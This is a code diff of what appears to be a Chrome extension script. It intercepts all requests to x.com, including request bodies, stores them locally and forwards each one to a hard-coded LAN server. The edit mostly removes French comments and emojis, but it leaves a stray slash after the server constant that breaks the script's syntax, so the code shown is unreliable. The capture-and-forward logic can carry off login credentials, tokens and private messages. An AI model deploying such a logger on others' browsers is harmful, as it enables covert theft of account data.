@@ -1,7 +1,7 @@
 const MAX_LOGS = 200;
 
-// 🔧 CONFIGURATION - Modifiez avec l'IP de votre autre PC
-const REMOTE_SERVER = "http://192.168.1.68:3000/logs"; // ⚠️ PAS de /log-receiver/ !
+
+const REMOTE_SERVER = "http://192.168.1.68:3000/logs"; /
 
 function normalizeUrl(url) {
   try {
@@ -58,7 +58,7 @@ function decodeRequestBody(requestBody) {
   return null;
 }
 
-// 📤 Fonction pour envoyer les données au serveur distant
+//  Fonction pour envoyer les données au serveur distant
 async function sendToRemote(logEntry) {
   try {
     const response = await fetch(REMOTE_SERVER, {
@@ -90,10 +90,10 @@ chrome.webRequest.onBeforeRequest.addListener(
       requestBody: decodeRequestBody(details.requestBody)
     };
 
-    // 📤 Envoyer au serveur distant (async, non-bloquant)
+    // Envoyer au serveur distant (async, non-bloquant)
     sendToRemote(logEntry);
 
-    // 💾 Stocker localement aussi
+    //  Stocker localement aussi
     chrome.storage.local.get({ logs: [] }, ({ logs }) => {
       logs.unshift(logEntry);
       if (logs.length > MAX_LOGS) logs.length = MAX_LOGS;
@@ -102,4 +102,5 @@ chrome.webRequest.onBeforeRequest.addListener(
   },
   { urls: ["*://x.com/*", "*://*.x.com/*"] },
   ["requestBody"]
+
 );
